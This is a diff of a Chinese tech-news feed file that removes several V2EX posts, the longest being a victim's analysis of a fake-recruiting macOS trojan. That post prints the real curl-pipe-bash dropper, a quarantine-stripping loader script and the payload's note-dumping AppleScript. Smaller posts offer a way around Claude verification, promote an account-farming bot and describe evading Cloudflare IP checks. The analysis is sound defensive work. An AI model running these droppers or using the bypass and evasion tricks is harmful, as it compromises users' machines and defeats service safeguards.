-&lt;p&gt;打字这边，双拼除了小鹤，现在也能选自然码。平时用万象 Pro 自然码形码的话，打完两键双拼，可以接着打辅码找单字。九宫格竖屏加了侧栏，上面可以放自己常用的标点，在数字键上滑也能直接输数字。全拼也可以在一句里夹英文，比如「我家的 Wi-Fi 密码」，中间不用切英文键盘。&lt;/p&gt;
-&lt;p&gt;还有个一直在磨的地方是误触。比如手快把「这个效果很好」里的 xiao guo 打成了 xiao fu o，键盘会结合落点试着把整句找回来。像 zihao 这种本来就能打出「自豪」的，还是让「自豪」排在前面。打字、纠错和词频学习都在设备上做。&lt;/p&gt;
-&lt;p&gt;两张候选截图，分别展示正常拼音和整句误触纠错&lt;/p&gt;
-&lt;p&gt;TestFlight 的 2.7.0 还在试大千注音（用的是小麥注音词库）、英文滑行输入，以及在「边写边译」里直接说中文。比如要回一条英文消息，可以在当前输入框里口述，让键盘出译文。&lt;/p&gt;
-&lt;p&gt;基础打字、纠错和导入 Rime 方案都免费，无广告。语音、边写边译和 AI 脚本在一次买断的 Pro 里。基础键盘可以直接用内置词库，想让键盘读到自己导入的方案，需要在 iOS 里开「允许完全访问」。&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" loading="lazy" src="https://yunxiansy.github.io/yunxian-feeds/media/a5b64c58dbd8d30bf23ac7fb8636280f8d3e0e6dcdb7e06e47855021e11c9361.png" /&gt;&lt;br /&gt;
-&lt;img alt="" loading="lazy" src="https://yunxiansy.github.io/yunxian-feeds/media/141c0db5ee42809339bbe3a8000467d58969baf635fa975d9ea741c3235c0c6d.png" /&gt;&lt;/p&gt;
-
-	</content>
-    <source>
-      <title>V2EX</title>
-      <link rel="self" href="https://www.v2ex.com/index.xml"/>
-      <link rel="alternate" href="https://www.v2ex.com/"/>
-    </source>
-  </entry>
-  <entry>
     <id>urn:uuid:d57ed757-3a40-5a90-989b-6d8bcef5c727</id>
     <title>限时 11.99 万元起，日产 NX7 标配宁德时代电池，还有Momenta 智驾｜广州车展</title>
     <updated>2026-11-27T12:09:14.000Z</updated>
@@ -1952,53 +2465,6 @@ CPU： Intel 13400&lt;br /&gt;
     </source>
   </entry>
   <entry>
-    <id>urn:uuid:f338b9a6-d548-5d2b-9efa-e96edc5b9704</id>
-    <title>[Claude] 已获准访问 Claude CVP</title>
-    <updated>2026-11-27T12:07:13.000Z</updated>
-    <author>
-      <name>jinglaef</name>
-    </author>
-    <published>2026-11-27T12:07:13.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260434#reply0"/>
-    <category term="IT 科技"/>
-    <content type="html">
-	&lt;p&gt;我们找到了完成 Claude CVP 验证的方法，如果有感兴趣的朋友，可以联系我：@andeliexin (telegram)&lt;/p&gt;
-&lt;p&gt;用于软件逆向工程与分析。&lt;/p&gt;
-&lt;p&gt;Mythos 5.1 和 5.2 为闭源模型，可在 Max 和 Ultra 订阅计划中使用。&lt;/p&gt;
-
-	</content>
-    <source>
-      <title>V2EX</title>
-      <link rel="self" href="https://www.v2ex.com/index.xml"/>
-      <link rel="alternate" href="https://www.v2ex.com/"/>
-    </source>
-  </entry>
-  <entry>
-    <id>urn:uuid:c0380c27-ccde-5879-8721-6c8b2eb02fdd</id>
-    <title>[问与答] 小红书助手用户数快一千了，反馈群却没几个人，冷启动该怎么做？</title>
-    <updated>2026-11-27T12:02:48.000Z</updated>
-    <author>
-      <name>gybin02</name>
-    </author>
-    <published>2026-11-27T12:02:48.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260433#reply2"/>
-    <category term="IT 科技"/>
-    <content type="html">
-	&lt;p&gt;做了一个小红书养号助手，Chrome 扩展。功能就三块：发现页养号（模拟真实浏览节奏，互动概率可调）、评论区截流（筛意向词、AI 回评论找线索）、数据看板（每天浏览点赞收藏评论一目了然），另外还有私信自动回复和通知自动化。&lt;/p&gt;
-&lt;p&gt;&lt;img alt="小红书养号助手" loading="lazy" src="https://yunxiansy.github.io/yunxian-feeds/media/2e4af12f36768908511811035b6e1207e277972083eb72778c0500b9a5d91fa0.jpg" /&gt;&lt;/p&gt;
-&lt;p&gt;数字上看还行：Chrome 商店过去 30 天装了 778 次，总用户快一千了，每天二三十个新装。但有个地方很奇怪——安装量 83% 来自罗马尼亚，语言却 83% 是中文（中国）。真人到底有多少，我自己都犯嘀咕。&lt;/p&gt;
-&lt;p&gt;更想不通的是反馈群：我拉了个群，想让用的人进来聊聊哪不好用、想加什么功能，结果进群的没几个人，群里也基本没人说话。&lt;/p&gt;
-&lt;p&gt;装的人不少，愿意留下来交流的几乎没有。是群入口藏得太深，还是工具类产品天生就很难聚人？又或者大家装完就用，用得顺手也不吭声，出问题直接就卸了？&lt;/p&gt;
-&lt;p&gt;想问问做过工具冷启动的，头一批愿意说话的用户都是怎么聚起来的？是得一个个私聊去请，还是在产品里埋点什么钩子，还是压根不该指望群，得换个方式收反馈？&lt;/p&gt;
-
-	</content>
-    <source>
-      <title>V2EX</title>
-      <link rel="self" href="https://www.v2ex.com/index.xml"/>
-      <link rel="alternate" href="https://www.v2ex.com/"/>
-    </source>
-  </entry>
-  <entry>
     <id>urn:uuid:abc3d8c1-4394-5f99-9f9f-487ea4919234</id>
     <title>PingCAP数据泄露事件暴露客户记录与源代码</title>
     <updated>2026-11-27T12:00:00.000Z</updated>
@@ -2013,438 +2479,6 @@ CPU： Intel 13400&lt;br /&gt;
       <title>InfoQ 中文站</title>
       <link rel="self" href="https://www.infoq.cn/feed.xml"/>
       <link rel="alternate" href="https://www.infoq.cn"/>
-    </source>
-  </entry>
-  <entry>
-    <id>urn:uuid:f2daee67-b41b-5735-82e7-c23a383c1345</id>
-    <title>[分享发现] 未来 DIY 装机真的会彻底式微吗？</title>
-    <updated>2026-11-27T11:45:02.000Z</updated>
-    <author>
-      <name>pigspy</name>
-    </author>
-    <published>2026-11-27T11:45:02.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260430#reply9"/>
-    <category term="IT 科技"/>
-    <content type="html">
-	&lt;p&gt;楼主在一家手机厂商工作，今天参加了公司的一场分享会，主要内容是讲手机发展趋势的，但是最后提了一嘴电脑市场，我听下来感觉有以下几个点很有意思&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;未来 DIY 市场可能会彻底沦为一个非常小众的版块&lt;/li&gt;
-&lt;li&gt;未来大众使用电脑的主要形态是笔记本和一体化主机&lt;/li&gt;
-&lt;li&gt;点名了最近新出的鸿蒙笔记本，说桌面操作系统的发展趋势就是移动化，公司未来可能也要尝试出安卓电脑&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;但是我接触的周围的人感觉大部分还是自己装机的，不会买品牌机，diy 装机应该还是十年内主要的使用方式吧？&lt;/p&gt;
-
-	</content>
-    <source>
-      <title>V2EX</title>
-      <link rel="self" href="https://www.v2ex.com/index.xml"/>
-      <link rel="alternate" href="https://www.v2ex.com/"/>
-    </source>
-  </entry>
-  <entry>
-    <id>urn:uuid:84da53a9-46cf-5ef3-a9d2-748ffff45ef2</id>
-    <title>[互联网] 曝光一个骗子 以招聘为由诱导下载木马软件</title>
-    <updated>2026-11-27T11:37:53.000Z</updated>
-    <author>
-      <name>aaronzyf</name>
-    </author>
-    <published>2026-11-27T11:37:53.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260429#reply9"/>
-    <category term="IT 科技"/>
-    <content type="html">
-	&lt;h1&gt;在 V2EX 被"招聘"搭话，对方发来的是 macOS 远控木马（附完整技术分析）&lt;/h1&gt;
-&lt;p&gt;先说结论：对方以"远程岗位招聘"为由，诱导我执行一条 &lt;code&gt;curl | bash&lt;/code&gt; 命令安装所谓的公司远程协作工具。该脚本下载的是一个&lt;strong&gt;未签名的 macOS 木马&lt;/strong&gt;，具备窃取浏览器 Cookie / 保存的密码、遍历备忘录、远程执行命令的能力。&lt;/p&gt;
-&lt;p&gt;我已完整逆向分析并保留全部证据。把过程发出来，一是提醒还在找工作的人，二是给遇到类似情况的人一个对照样本。&lt;/p&gt;
-&lt;hr /&gt;
-&lt;h2&gt;一、对方怎么找上我的&lt;/h2&gt;
-&lt;p&gt;对方是在 V2EX 上找到我的，但&lt;strong&gt;没有走站内私信&lt;/strong&gt;——直接通过 Telegram 加了我，之后所有沟通都在那里进行。&lt;/p&gt;
-&lt;p&gt;这一步值得单独拎出来说：&lt;strong&gt;绕开平台、直接加 Telegram，是这类骗局的标准起手式。&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;站内有私信、有记录、有举报入口；转到 TG 之后，平台侧完全失去监管和留痕能力&lt;/li&gt;
-&lt;li&gt;Telegram 账号可以随时注销重开，成本接近于零，追查难度比微信高一个量级&lt;/li&gt;
-&lt;li&gt;聊天记录只存在于你自己的设备，平台方拿不出任何证据链，取证全靠自己&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;从"不打招呼直接加好友"这个动作本身就能看出来：他手里有一批从站内扒下来的联系方式，在批量撒网，不是在认真招人。&lt;/p&gt;
-&lt;p&gt;加上之后流程走得很顺：几乎不问技术细节就"录用"，随后要求安装"公司内部协作工具"用于面试和日常沟通。&lt;/p&gt;
-&lt;p&gt;另外几个细节：&lt;strong&gt;对方从始至终没有提供过公司官网、没有发过一封企业邮箱邮件、没有安排过一次正式的视频面试。&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;涉事账号：V2EX 与 Telegram 使用同一个 ID —— &lt;strong&gt;mxnhqi&lt;/strong&gt;。&lt;/p&gt;
-&lt;hr /&gt;
-&lt;h2&gt;二、对方给了三条路，每一条都指向同一个木马&lt;/h2&gt;
-&lt;h3&gt;路线 1：dmg 安装包&lt;/h3&gt;
-&lt;p&gt;从 &lt;code&gt;/invite/&amp;lt;64位十六进制&amp;gt;&lt;/code&gt; 这个邀请链接进去，页面同时提供 macOS 和 Windows 两个下载按钮。&lt;/p&gt;
-&lt;p&gt;下载下来的 dmg 打开后是这样的：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;Installer.file          （921 字节的 bash 脚本）
-Open Terminal -&amp;gt;        （指向系统终端的符号链接）
-.back/installer         （隐藏的 5MB 可执行文件）
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;strong&gt;里面根本没有 App。&lt;/strong&gt; 它的设计是让你把 &lt;code&gt;Installer.file&lt;/code&gt; 拖进终端执行。而这个脚本做的事是：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;#!/bin/bash
-DIR="$(cd "$(dirname "$0")" &amp;amp;&amp;amp; pwd)"
-APP_NAME="installer"
-APP_PATH="$DIR/.back/$APP_NAME"
-TEMP_APP="/tmp/$APP_NAME"
-cp -r "$APP_PATH" "$TEMP_APP"
-xattr -c "$TEMP_APP"        # 清除 quarantine 属性
-chmod +x "$TEMP_APP"
-clear
-nohup /tmp/installer &amp;amp;&amp;gt;/dev/null &amp;amp;
-clear
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;code&gt;xattr -c&lt;/code&gt; 这一行是关键——它主动抹掉系统的隔离标记，让 Gatekeeper 完全失去校验机会。&lt;/p&gt;
-&lt;p&gt;脚本开头还写了一段注释，用"为了减少对 Apple 开发者系统的依赖""保持分发简单透明"来解释为什么不做代码签名。&lt;strong&gt;正规模拟招聘的公司不会这样解释自己为什么不签名。&lt;/strong&gt;&lt;/p&gt;
-&lt;h3&gt;路线 2：一条 curl 命令&lt;/h3&gt;
-&lt;pre&gt;&lt;code&gt;curl -s https://macos.velunivo.app/install | bash
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;实际拿到的脚本：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;#!/usr/bin/env bash
-APP_NAME="Velunivo"
-DLOAD_URL="https://macos.velunivo.app/module"
-TMP_DIR=$(mktemp -d)
-APP_PATH="$TMP_DIR/$APP_NAME"
-
-curl -fsL "$DLOAD_URL" -o "$APP_PATH" || {
-    printf 'Installation failed. Please install and enable a VPN, then try again.\n' &amp;gt;&amp;amp;2
-    exit 1
-}
-chmod +x "$APP_PATH"
-nohup "$APP_PATH" &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;
-sleep 3m
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;逐条看意图：&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;写法&lt;/th&gt;
-&lt;th&gt;目的&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;mktemp -d&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;装进临时目录，没有 App 图标、没有安装记录、没有卸载入口，事后很难发现和清理&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;chmod +x&lt;/code&gt; + &lt;code&gt;nohup&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;完全绕开签名校验与公证流程&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;&amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;静默后台驻留，终端无任何输出&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;sleep 3m&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;让终端卡住三分钟，制造"正在安装配置"的假象，同时防止你 Ctrl-C&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;失败时提示"请安装并启用 VPN 再试"&lt;/td&gt;
-&lt;td&gt;&lt;strong&gt;最可疑的一处&lt;/strong&gt;：正规软件不会要求你先装 VPN。真实目的是借你的手绕过网络与安全软件的拦截&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;&lt;/table&gt;&lt;h3&gt;路线 3：Windows 安装包&lt;/h3&gt;
-&lt;p&gt;同一个页面还有 Windows 版，109MB，NSIS 自解压格式。我在 macOS 上所以没有执行，但拿到了 SHA256。&lt;/p&gt;
-&lt;hr /&gt;
-&lt;h2&gt;三、载荷分析&lt;/h2&gt;
-&lt;pre&gt;&lt;code&gt;文件名      Velunivo（dmg 内为 installer）
-格式        Mach-O universal binary（x86_64 + arm64）
-大小        5,008,840 字节
-语言        Rust（字符串中存在 rustc / crates.io 路径）
-签名        adhoc，linker-signed，Identifier = "installer"，Team ID 为空
-Gatekeeper  rejected — no usable signature
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;三个样本，两个版本：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;curl 版   SHA256 550576cf42733123e58315c1718bdd9b0507ddcf88176824d72dc3e2402169c8
-dmg  版   SHA256 be09049d8cc5530c0cd59936c9d55702a83e23bffe73a04d0047f99fe4a7f108
-exe  版   SHA256 91bb342d05af5d0231dc53e895f0cd96c02ea87e122cf3485388e034af5b2807
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;二进制做了重度字符串混淆（4.7MB 的文件只有约 2200 条可见字符串），但&lt;strong&gt;导入符号是藏不住的&lt;/strong&gt;：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;execvp / posix_spawnp / fork / setsid / dup2    远程执行任意命令、脱离终端会话
-OSAKit + OSAScript                              运行时执行 AppleScript
-sqlite3_open_v2 / prepare_v2 / column_text      读取本地 SQLite 数据库
-SecTrustSetAnchorCertificatesOnly               硬编码自签证书，防中间人抓包
-chroot / setuid / setgroups                     权限操作
-dlsym                                           动态获取 API，规避静态检测
-SCDynamicStoreCopyProxies                       读取系统代理设置
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;字符串里还有三样东西很说明问题：&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;1. &lt;code&gt;saltysalt&lt;/code&gt;&lt;/strong&gt; —— 这是 Chrome / Chromium 系浏览器在 macOS 上加密 Cookie 和保存密码时用的固定 salt，配合钥匙串里的 &lt;code&gt;Chrome Safe Storage&lt;/code&gt; 密钥即可解出明文。旁边紧挨着 &lt;code&gt;usernamepassword&lt;/code&gt;。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;2. 一段明文 AppleScript&lt;/strong&gt; ——&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;set theResult to display dialog "" with title "" buttons theButtons default button "" with icon caution
-tell application "Notes"
-    repeat with theAccount in accounts
-        repeat with theFolder in folders of theAccount
-            repeat with theNote in notes of theFolder
-                set safeTitle to do shell script "echo " &amp;amp; quoted form of noteTitle &amp;amp; " | tr -cd '[:alnum:] _-'"
-                set filePath to "/" &amp;amp; safeTitle &amp;amp; ".html"
-                write noteBody to fileRef
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;第一行是弹一个带警告图标的&lt;strong&gt;假对话框&lt;/strong&gt;，标题和正文在二进制里是空的——实际文案由服务器运行时下发，按钮也由服务器指定，可以随时伪装成"需要输入密码以继续"。后面是遍历备忘录的所有账户、文件夹、笔记，逐篇导出成 html。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;3. 主机指纹采集模板&lt;/strong&gt; —— &lt;code&gt;OS / CPU / Cores / RAM / GPU / Resolution / countryCode&lt;/code&gt;。&lt;/p&gt;
-&lt;hr /&gt;
-&lt;h2&gt;四、服务端在做什么&lt;/h2&gt;
-&lt;p&gt;&lt;strong&gt;按 User-Agent 分流。&lt;/strong&gt; 用 Safari 打开域名返回 &lt;code&gt;404 not found&lt;/code&gt;，用 curl 请求同一条路径返回 200 和上面的恶意脚本。也就是说，浏览器访问、安全厂商爬虫、以及"我自己点开看看"，看到的都是空白。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;有完整的后台体系。&lt;/strong&gt; 下载链接长这样：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;https://velunivo.app/invite/cc45293cab1e…      （完整串已提交警方）
-https://velunivo.app/api/downloads/macos?id=2c3cdcf9…
-https://velunivo.app/api/downloads/windows?id=c75b020f…
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;code&gt;/invite/&lt;/code&gt; 后面是每人唯一的邀请码，&lt;code&gt;/api/downloads/&lt;/code&gt; 每次下载单独编号。对方能精确知道谁、几点、下了哪个平台。这是一套有用户表、有统计的运营系统，不是单人拼凑的脚本。&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;提醒：&lt;strong&gt;不要访问上述域名&lt;/strong&gt;，也不要用浏览器点开验证。它对普通访问返回 404，但你的访问记录（含 UA、IP）会落进对方日志。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;strong&gt;基础设施：&lt;/strong&gt; &lt;code&gt;macos.velunivo.app&lt;/code&gt; 解析到 &lt;code&gt;185.163.0.1&lt;/code&gt;（G-Core Labs 客户段，美国），nginx + Express，带 CDN 边缘节点。&lt;/p&gt;
-&lt;hr /&gt;
-&lt;h2&gt;五、我这台机器的情况（可作为对照参考）&lt;/h2&gt;
-&lt;p&gt;前后试了 6 次（dmg 版和 curl 版各若干次），&lt;strong&gt;6 次全部崩溃&lt;/strong&gt;，每次启动 18-20 秒后 &lt;code&gt;SIGABRT&lt;/code&gt;，即程序自己调用 &lt;code&gt;abort()&lt;/code&gt; 退出，不是被系统杀掉。&lt;/p&gt;
-&lt;p&gt;崩溃日志里有个很有用的信息：崩溃瞬间进程内只有 12 个动态库。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;installer, libobjc-trampolines, libsystem_kernel, libsystem_pthread,
-libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;code&gt;libsqlite3.dylib&lt;/code&gt;、&lt;code&gt;OSAKit.framework&lt;/code&gt;、&lt;code&gt;Security.framework&lt;/code&gt; &lt;strong&gt;一个都没有加载&lt;/strong&gt;。&lt;/p&gt;
-&lt;p&gt;macOS 的 dyld 是懒加载的，函数第一次被调用时才会把库载入进程。所以这可以反推出：它没有执行过任何 SQLite 调用（没读浏览器数据库）、没有执行过 AppleScript（没碰备忘录）、也没建立过 TLS 连接（没往外传数据）。&lt;strong&gt;它加载完 GUI 框架就崩了，连数据窃取的代码都没跑到。&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;结论是这次没有造成实际损失，但这属于运气，不是它手下留情。&lt;/p&gt;
-&lt;hr /&gt;
-&lt;h2&gt;六、给还在找工作的同学几条硬标准&lt;/h2&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;strong&gt;对方要求加 Telegram / 微信、把你拉出招聘平台私聊的，从这里就该停。&lt;/strong&gt; 这一步没有别的解释——站内沟通有审核、有记录、能举报，转私域的唯一好处就是不受监管。岗位真的存在，就不怕在平台上谈。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;任何要求你 &lt;code&gt;curl | bash&lt;/code&gt; 安装的"公司工具"，100% 是假的。&lt;/strong&gt; 正常企业用 MDM 分发，或者给已签名公证的 dmg。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;dmg 里如果只有"把文件拖进终端"的快捷方式，直接删。&lt;/strong&gt; 正常 App 是拖进 &lt;code&gt;/Applications&lt;/code&gt;。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;失败时让你"开个 VPN 再试"的，一定有问题。&lt;/strong&gt; 这是在借你的手绕开拦截。&lt;/li&gt;
-&lt;li&gt;想验证一个"工具"真假，最快的办法：用浏览器和 curl 各访问一次同一个 URL。&lt;strong&gt;只对 curl 返回内容、对浏览器返回 404 的，就是恶意分发。&lt;/strong&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;hr /&gt;
-&lt;h2&gt;七、后续&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;完整样本（三个平台）、6 份崩溃日志、签名信息、下载来源 URL 均已存档&lt;/li&gt;
-&lt;li&gt;正在向公安机关报案，相关材料已备齐&lt;/li&gt;
-&lt;li&gt;涉事账号 &lt;code&gt;mxnhqi&lt;/code&gt;（V2EX 与 Telegram 同名）已提交站方与平台处理&lt;/li&gt;
-&lt;/ul&gt;
-&lt;blockquote&gt;
-&lt;p&gt;说明：发这段不是为了让大家去"对线"或者验证。对方账号随时可以弃用，去加好友只会暴露你自己。看到同名账号直接拉黑就好，剩下的交给平台和警方。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;如果有人在 V2EX 或其它平台遇到过 &lt;code&gt;velunivo&lt;/code&gt;、&lt;code&gt;Velunivo&lt;/code&gt;、或者类似"远程协作工具 / 内部办公系统 / 面试专用客户端"的安装要求，欢迎在下面留言，我们一起把 IOC 补全。&lt;/p&gt;
-&lt;p&gt;也提醒一句：这类团伙会换域名重来，但手法不会变——&lt;strong&gt;临时目录、裸二进制、消除 quarantine、劝你开 VPN&lt;/strong&gt;，这四个特征凑齐两个就该停手了。&lt;/p&gt;
-
-	</content>
-    <source>
-      <title>V2EX</title>
-      <link rel="self" href="https://www.v2ex.com/index.xml"/>
-      <link rel="alternate" href="https://www.v2ex.com/"/>
-    </source>
-  </entry>
-  <entry>
-    <id>urn:uuid:bcd5b27e-2e0a-56df-959d-9679f760228f</id>
-    <title>[分享创造] V 站有多少人还在玩 GTA？年纪大了是不是越来越没耐心玩游戏了？</title>
-    <updated>2026-11-27T11:34:49.000Z</updated>
-    <author>
-      <name>zdp072</name>
-    </author>
-    <published>2026-11-27T11:34:49.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260428#reply8"/>
-    <category term="IT 科技"/>
-    <content type="html">
-	&lt;p&gt;感觉程序员里面喜欢 GTA 系列的人应该不少。&lt;/p&gt;
-&lt;p&gt;以前玩游戏，碰到一个任务过不去，还愿意自己琢磨半天。现在玩游戏，卡个几分钟就想直接搜攻略，恨不得跳过所有不必要的环节。&lt;/p&gt;
-&lt;p&gt;特别是上班之后，一天能留给游戏的时间本来就不多，要是再花半个小时找个保险箱密码，感觉比上班 Debug 还累。&lt;/p&gt;
-&lt;p&gt;最近折腾了一个 GTA 6 保险箱密码查询的小工具：&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://gta6safecode.codes/"&gt;https://gta6safecode.codes/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;没什么复杂的功能，就是想把这种需要翻攻略才能找到的信息集中到一起。&lt;/p&gt;
-&lt;p&gt;不过话说回来，现在玩游戏直接查攻略，是不是也少了很多探索的乐趣？&lt;/p&gt;
-&lt;p&gt;以前玩 GTA，甚至可以不做任务，开着车在地图上瞎逛几个小时。现在打开一个游戏，恨不得每一分钟都玩得有效率。&lt;/p&gt;
-&lt;p&gt;也不知道是游戏变了，还是人变了。&lt;/p&gt;
-&lt;p&gt;挺好奇 V 站的各位：&lt;/p&gt;
-&lt;p&gt;三四十岁的程序员，现在还有多少人能静下心来玩几个小时的游戏？&lt;/p&gt;
-&lt;p&gt;平时是自己慢慢探索，还是遇到问题直接查攻略？&lt;/p&gt;
-&lt;p&gt;有没有那种买游戏的热情远远大于玩游戏的热情，Steam 库里一堆游戏，真正通关的却没几个的？&lt;/p&gt;
-
-	</content>
-    <source>
-      <title>V2EX</title>
-      <link rel="self" href="https://www.v2ex.com/index.xml"/>
-      <link rel="alternate" href="https://www.v2ex.com/"/>
-    </source>
-  </entry>
-  <entry>
-    <id>urn:uuid:981596d0-a4b6-5fb5-8e71-3c1eb1d13307</id>
-    <title>[🤖Vibe Coding] 为了防止大家不知道，其实 muse 里面的托管浏览器是有两个网络出口环境的</title>
-    <updated>2026-11-27T11:29:16.000Z</updated>
-    <author>
-      <name>Tink</name>
-    </author>
-    <published>2026-11-27T11:29:16.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260427#reply0"/>
-    <category term="IT 科技"/>
-    <content type="html">
-	&lt;p&gt;一般情况下环境一是 Cloudflare 的机房 IP，比较藏，大概率访问 X 都会被禁；环境二都是美国当地的家庭宽带，IP 很干净，可以用来过一些带 CF 盾或者对 IP 要求比较高的站点。&lt;/p&gt;
-&lt;p&gt;有些还是星链的地址，纯净度很高。可以合理利用。&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://yunxiansy.github.io/yunxian-feeds/media/d745b370162b62db67fab10e292e3f7cfcafe18272b5c74d545639e734d8391e.png" target="_blank"&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/d745b370162b62db67fab10e292e3f7cfcafe18272b5c74d545639e734d8391e.png" /&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://yunxiansy.github.io/yunxian-feeds/media/d9f584b3fe2ef100d96a73b66e98f122850b642b264e8598db751dc944338698.jpg" target="_blank"&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/d9f584b3fe2ef100d96a73b66e98f122850b642b264e8598db751dc944338698.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://yunxiansy.github.io/yunxian-feeds/media/9bf07669dfb3e581299e42b96a9dd58ead44014b33f85c820eb1b743d8bf80b6.jpg" target="_blank"&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/9bf07669dfb3e581299e42b96a9dd58ead44014b33f85c820eb1b743d8bf80b6.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://yunxiansy.github.io/yunxian-feeds/media/b64e1ca61eed703e6f73e760012514bec351a634d70f373e858ff1c49eab6f2a.jpg" target="_blank"&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/b64e1ca61eed703e6f73e760012514bec351a634d70f373e858ff1c49eab6f2a.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://yunxiansy.github.io/yunxian-feeds/media/bcb310869dc5b9fb481da58d09920070d595a5f17181e19fb8c12a22de2c6bf9.jpg" target="_blank"&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/bcb310869dc5b9fb481da58d09920070d595a5f17181e19fb8c12a22de2c6bf9.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://yunxiansy.github.io/yunxian-feeds/media/d990704529529efd6dc021e4c9b62ee529b2622202c5fdd78fd573f2cbc36a0d.jpg" target="_blank"&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/d990704529529efd6dc021e4c9b62ee529b2622202c5fdd78fd573f2cbc36a0d.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
-
-	</content>
-    <source>
-      <title>V2EX</title>
-      <link rel="self" href="https://www.v2ex.com/index.xml"/>
-      <link rel="alternate" href="https://www.v2ex.com/"/>
-    </source>
-  </entry>
-  <entry>
-    <id>urn:uuid:7618e47f-8c75-500e-aa55-4582d2523fdb</id>
-    <title>[职场话题] 不要再把简历文件直接发送给 HR 了，使用 ViviResume 进行在线简历制作</title>
-    <updated>2026-11-27T11:15:06.000Z</updated>
-    <author>
-      <name>rangerheart</name>
-    </author>
-    <published>2026-11-27T11:15:06.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260426#reply2"/>
-    <category term="IT 科技"/>
-    <content type="html">
-	&lt;p&gt;不要再把简历文件直接发送给 HR 了，使用 &lt;strong&gt;&lt;a href="https://viviresume.com/"&gt;ViviResume&lt;/a&gt;&lt;/strong&gt; 直接发送简历链接；不合适的话，还能把简历撤回。&lt;/p&gt;
-&lt;p&gt;ViviResume 是一款在浏览器中制作简历的工具。&lt;/p&gt;
-&lt;p&gt;使用模板一边填写个人资料，一边的页面会实时显示排版效果。&lt;/p&gt;
-&lt;p&gt;数据会自动保存在当前浏览器，不上传云端，隐私数据一直在本地。&lt;/p&gt;
